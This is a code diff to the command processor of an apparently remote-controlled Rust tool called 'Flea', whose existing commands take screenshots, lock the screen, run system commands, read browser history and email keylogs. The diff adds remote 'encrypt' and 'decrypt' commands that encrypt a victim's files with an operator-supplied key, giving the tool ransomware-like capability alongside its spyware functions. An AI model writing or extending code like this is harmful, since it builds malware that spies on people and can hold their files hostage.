@@ -8,6 +8,7 @@ use std::{str, env, path::PathBuf};
 use log::{debug, error};
 use chrono::{DateTime, Utc};
 use crate::email::EMail;
+use crate::fileencrypter::FileEncrypter;
 use crate::fileserver::FileServer;
 use crate::{ftp::*, screenshot::Screenshot};
 use crate::{systemcmd::*, browserhistory};
@@ -35,6 +36,8 @@ const GET_WORKING_DIR_COMMAND: &str = "pwd";
 const RESTART_COMMAND: &str = "restart";
 const LOCK_SCREEN_COMMAND: &str = "lockscreen";
 const SEND_KEYLOG_TO_EMAIL_COMMAND: &str = "sendkeylog";
+const ENCRYPT_FILE_COMMAND: &str = "encrypt";
+const DECRYPT_FILE_COMMAND: &str = "decrypt";
 pub const STOP_COMMAND: &str = "quit";
 const UNKNOWN_COMMAND: &str = "Unknown command";
 
@@ -112,7 +115,7 @@ impl CommandProcessor
 {    
     /// Gets a temporary directory path for a screenshot file
     /// * Returns a path to a temporary directory with a screenshot filename which is a unique name
-    fn get_temp_dir(&self) -> PathBuf
+    fn get_temp_dir_for_screenshot(&self) -> PathBuf
     {
         let now: DateTime<Utc> = Utc::now();
         let file_name = format!("screenshot{}.png", now.format("%Y-%m-%d_%H-%M-%S"));
@@ -457,7 +460,7 @@ impl FleaCommand for CommandProcessor
 
             GET_SCREENSHOT_COMMAND =>
             {
-                let current_path = self.get_temp_dir();
+                let current_path = self.get_temp_dir_for_screenshot();
                 match self.screenshot.take_screenshot(current_path.to_str().unwrap()) 
                 {
                     Ok(x) =>
@@ -494,7 +497,7 @@ impl FleaCommand for CommandProcessor
 
             SEND_PIC_COMMAND =>
             {
-                let current_path = self.get_temp_dir();
+                let current_path = self.get_temp_dir_for_screenshot();
                 match self.screenshot.take_screenshot(current_path.to_str().unwrap()) 
                 {
                     Ok(x) =>
@@ -616,6 +619,49 @@ impl FleaCommand for CommandProcessor
                         x.to_string()
                     }                
                 }
+            },
+
+            ENCRYPT_FILE_COMMAND =>
+            {
+                //value has key and file name separated by ;
+                //split the value and encrypt the file
+
+                let mut parts = value.split(';');
+                if let (Some(key), Some(file_name), None) = (parts.next(), parts.next(), parts.next()) 
+                {
+                    let encrypter = FileEncrypter::new(key.to_string());
+                    match encrypter.encrypt_file(file_name) 
+                    {
+                        Ok(_) => "Ok".to_string(),
+                        Err(x) => x.to_string()
+                    }
+                } 
+                else 
+                {
+                    "Invalid input".to_string()
+                }
+            },
+
+            DECRYPT_FILE_COMMAND =>
+            {
+                //value has key and file name separated by ;
+                //split the value and decrypt the file
+
+                let mut parts = value.split(';');
+                if let (Some(key), Some(file_name), None) = (parts.next(), parts.next(), parts.next()) 
+                {
+                    let encrypter = FileEncrypter::new(key.to_string());
+                    match encrypter.decrypt_file(file_name) 
+                    {
+                        Ok(_) => "Ok".to_string(),
+                        Err(x) => x.to_string()
+                    }
+                } 
+                else 
+                {
+                    "Invalid input".to_string()
+                }
+
             },
 
             STOP_COMMAND =>
